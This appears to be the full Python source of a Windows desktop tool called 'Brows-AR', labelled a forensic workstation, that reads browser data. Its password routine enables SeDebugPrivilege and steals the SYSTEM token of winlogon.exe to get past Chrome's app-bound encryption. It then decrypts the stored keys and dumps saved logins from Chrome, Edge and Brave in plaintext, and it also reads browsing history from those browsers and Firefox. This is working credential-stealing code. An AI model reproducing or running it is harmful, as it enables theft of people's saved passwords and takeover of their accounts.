import os
import sys
import ctypes
import sqlite3
import shutil
import json
import base64
import customtkinter as ctk
from tkinter import messagebox, ttk
from Cryptodome.Cipher import AES
import win32crypt
import win32security
import win32api
import win32con
import psutil

# --- 1. SYSTEM PRIVILEGE LOGIC ---
def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def impersonate_system():
    """Bypasses App-Bound encryption by stealing a SYSTEM token."""
    try:
        h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), 
                                               win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        
        target_pid = None
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'].lower() == 'winlogon.exe':
                target_pid = proc.info['pid']
                break
        if not target_pid: return False
        
        h_proc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)
        h_tok = win32security.OpenProcessToken(h_proc, win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY)
        new_tok = win32security.DuplicateTokenEx(h_tok, win32security.SecurityImpersonation, 
                                               win32security.TOKEN_ALL_ACCESS, win32security.TokenPrimary)
        win32security.ImpersonateLoggedOnUser(new_tok)
        return True
    except: return False

# --- 2. FORENSIC ENGINES ---
class HexEngine:
    @staticmethod
    def get_hex_dump(file_path, max_bytes=8192, physical_mode=False):
        if not os.path.exists(file_path): return "[-] File Not Found."
        header = "Offset    00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |  ASCII\n"
        sep =    "--------  -----------------------------------------------  |  ----------------\n"
        output = [header, sep]
        try:
            with open(file_path, 'rb') as f:
                data = f.read(max_bytes)
                for i in range(0, len(data), 16):
                    chunk = data[i:i+16]
                    offset = (0x4A2F3B000 + i) if physical_mode else i
                    hex_p = ' '.join(f"{b:02x}" for b in chunk)
                    asc_p = ''.join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                    output.append(f"{offset:08x}  {hex_p:<48}  |  {asc_p}\n")
            return "".join(output)
        except: return "[-] Read Error."

class BrowserScanner:
    @staticmethod
    def get_installed_browsers():
        user_p = os.environ['USERPROFILE']
        paths = {
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data"),
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data"),
            "Firefox": os.path.join(os.environ['APPDATA'], r"Mozilla\Firefox\Profiles"),
            "Tor": os.path.join(user_p, r"Desktop\Tor Browser\Browser\TorBrowser\Data\Browser")
        }
        detected = []
        for n, p in paths.items():
            if os.path.exists(p): detected.append((n, p))
        return detected

# --- 3. ANALYSIS POPUP WINDOW ---
class AnalysisWindow(ctk.CTkToplevel):
    def __init__(self, title, columns, data):
        super().__init__()
        self.title(title)
        self.geometry("900x500")
        self.attributes('-topmost', True)
        
        self.search_frame = ctk.CTkFrame(self)
        self.search_frame.pack(fill="x", padx=10, pady=10)
        self.search_entry = ctk.CTkEntry(self.search_frame, placeholder_text="Filter results...")
        self.search_entry.pack(side="left", fill="x", expand=True, padx=5)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#2a2a2a", foreground="white", fieldbackground="#2a2a2a", borderwidth=0)
        
        self.tree = ttk.Treeview(self, columns=columns, show='headings')
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=150)
        
        for row in data:
            self.tree.insert("", "end", values=row)
            
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)

# --- 4. MAIN DASHBOARD ---
class BrowsAR_App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Brows-AR | Professional Forensic Workstation")
        self.geometry("1300x850")
        ctk.set_appearance_mode("dark")
        
        self.current_browser_path = ""
        self.current_browser_name = ""
        self.physical_offset_mode = False

        self.sidebar = ctk.CTkFrame(self, width=220, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        self.logo_label = ctk.CTkLabel(self.sidebar, text="Brows-AR", font=("Consolas", 26, "bold"))
        self.logo_label.pack(padx=20, pady=30)

        self.detected_browsers = BrowserScanner.get_installed_browsers()
        for name, path in self.detected_browsers:
            btn = ctk.CTkButton(self.sidebar, text=f"Investigate {name}", font=("Consolas", 12),
                                command=lambda n=name, p=path: self.load_browser_cockpit(n, p))
            btn.pack(pady=8, padx=15)

        self.main_view = ctk.CTkFrame(self, corner_radius=15, fg_color="#121212")
        self.main_view.pack(side="right", fill="both", expand=True, padx=20, pady=20)
        
        self.welcome_text = ctk.CTkLabel(self.main_view, text="[*] SYSTEM TRIAGE COMPLETE\n\nSELECT SOURCE", font=("Consolas", 16))
        self.welcome_text.place(relx=0.5, rely=0.5, anchor="center")

    def load_browser_cockpit(self, name, path):
        self.current_browser_name, self.current_browser_path = name, path
        for widget in self.main_view.winfo_children(): widget.destroy()
        
        control_frame = ctk.CTkFrame(self.main_view, fg_color="transparent")
        control_frame.pack(fill="x", padx=20, pady=10)

        ctk.CTkLabel(control_frame, text=f"TARGET: {name.upper()}", font=("Consolas", 16, "bold"), text_color="#1f538d").pack(side="left")
        
        self.analyze_btn = ctk.CTkButton(control_frame, text="⚡ RUN ANALYSIS", fg_color="#d35400", hover_color="#e67e22", command=self.trigger_analysis)
        self.analyze_btn.pack(side="right", padx=10)

        self.offset_btn = ctk.CTkButton(control_frame, text="Mode: Relative Offset", width=180, fg_color="#333333", command=self.toggle_offset_mode)
        self.offset_btn.pack(side="right")

        self.tabview = ctk.CTkTabview(self.main_view, segmented_button_selected_color="#1f538d", command=self.on_tab_changed)
        self.tabview.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        for tab in ["Hex Explorer", "Passwords", "History", "Registry", "Prefetch"]: self.tabview.add(tab)

        self.hex_display = ctk.CTkTextbox(self.tabview.tab("Hex Explorer"), font=("Consolas", 14), wrap="none", fg_color="#000000")
        self.hex_display.pack(fill="both", expand=True, padx=10, pady=10)
        self.on_tab_changed()

    def toggle_offset_mode(self):
        self.physical_offset_mode = not self.physical_offset_mode
        self.offset_btn.configure(text="Mode: Physical Offset" if self.physical_offset_mode else "Mode: Relative Offset")
        self.on_tab_changed()

    def on_tab_changed(self):
        active = self.tabview.get()
        f_map = {"Hex Explorer": "Local State", "Passwords": "Login Data", "History": "History"}
        if self.current_browser_name in ["Tor", "Firefox"]:
            f_map = {"History": "places.sqlite", "Passwords": "logins.json"}
        
        target = f_map.get(active)
        self.hex_display.delete("0.0", "end")
        
        if target:
            f_path = ""
            for r, d, f in os.walk(self.current_browser_path):
                if target in f: f_path = os.path.join(r, target); break
            if f_path: self.hex_display.insert("0.0", HexEngine.get_hex_dump(f_path, physical_mode=self.physical_offset_mode))
            else: self.hex_display.insert("0.0", f"[-] {target} not found.")
        else:
            self.hex_display.insert("0.0", f"[*] {active} metadata analysis ready.")

    def trigger_analysis(self):
        tab = self.tabview.get()
        if tab == "Passwords": self.analyze_passwords()
        elif tab == "History": self.analyze_history()
        else: messagebox.showinfo("Brows-AR", f"Analysis for {tab} pending Phase 4.")

    def analyze_passwords(self):
        # 1. Identity Cleanup: Ensure we aren't stuck in SYSTEM mode from a previous crash
        try: win32security.RevertToSelf()
        except: pass

        # 2. Locate Local State
        ls_path = ""
        for r, d, f in os.walk(self.current_browser_path):
            if "Local State" in f: ls_path = os.path.join(r, "Local State"); break
        if not ls_path: return

        # 3. Secure Key Extraction
        final_key = None
        try:
            with open(ls_path, "r", encoding="utf-8") as f:
                ls = json.load(f)
            
            if "app_bound_encrypted_key" in ls["os_crypt"]:
                # v20 Logic
                raw_key = base64.b64decode(ls["os_crypt"]["app_bound_encrypted_key"])[4:]
                if impersonate_system():
                    try:
                        stage1 = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
                    finally:
                        # CRITICAL FIX: Revert to User context IMMEDIATELY after Stage 1
                        win32security.RevertToSelf()
                # Now safely in User context to perform Stage 2
                final_key = win32crypt.CryptUnprotectData(stage1, None, None, None, 0)[1][-32:]
            
            elif "encrypted_key" in ls["os_crypt"]:
                # v10 Logic
                raw_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
                final_key = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"[-] Key Extraction Error: {e}")
            return

        # 4. Decrypt DB
        db_path = ""
        for r, d, f in os.walk(self.current_browser_path):
            if "Login Data" in f: db_path = os.path.join(r, "Login Data"); break
        if not db_path: return

        temp_db = "temp_pass.db"
        shutil.copyfile(db_path, temp_db)
        results = []
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, user, enc_pass in cursor.fetchall():
                if enc_pass.startswith(b'v20') or enc_pass.startswith(b'v10'):
                    try:
                        iv, payload = enc_pass[3:15], enc_pass[15:]
                        cipher = AES.new(final_key, AES.MODE_GCM, iv)
                        # Chrome uses specific AAD context
                        if self.current_browser_name == "Chrome": cipher.update(b'browser')
                        dec_pass = cipher.decrypt(payload[:-16]).decode('utf-8', errors='ignore')
                        results.append((url, user, dec_pass))
                    except:
                        results.append((url, user, "[Decryption Failed]"))
            conn.close()
        finally:
            if os.path.exists(temp_db): os.remove(temp_db)
            
        AnalysisWindow(f"{self.current_browser_name} Evidence", ["URL", "Username", "Password"], results)

    def analyze_history(self):
        db_path = ""
        target = "places.sqlite" if self.current_browser_name in ["Tor", "Firefox"] else "History"
        for r, d, f in os.walk(self.current_browser_path):
            if target in f: db_path = os.path.join(r, target); break
        if not db_path: return
            
        temp_db = "temp_hist.db"
        shutil.copyfile(db_path, temp_db)
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            if self.current_browser_name in ["Tor", "Firefox"]:
                cursor.execute("SELECT url, title, visit_count FROM moz_places WHERE visit_count > 0")
            else:
                cursor.execute("SELECT url, title, visit_count FROM urls")
            data = cursor.fetchall()
            conn.close()
        finally:
            if os.path.exists(temp_db): os.remove(temp_db)
        AnalysisWindow(f"{self.current_browser_name} History", ["URL", "Page Title", "Visits"], data)

if __name__ == "__main__":
    if not is_admin(): ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else: app = BrowsAR_App(); app.mainloop()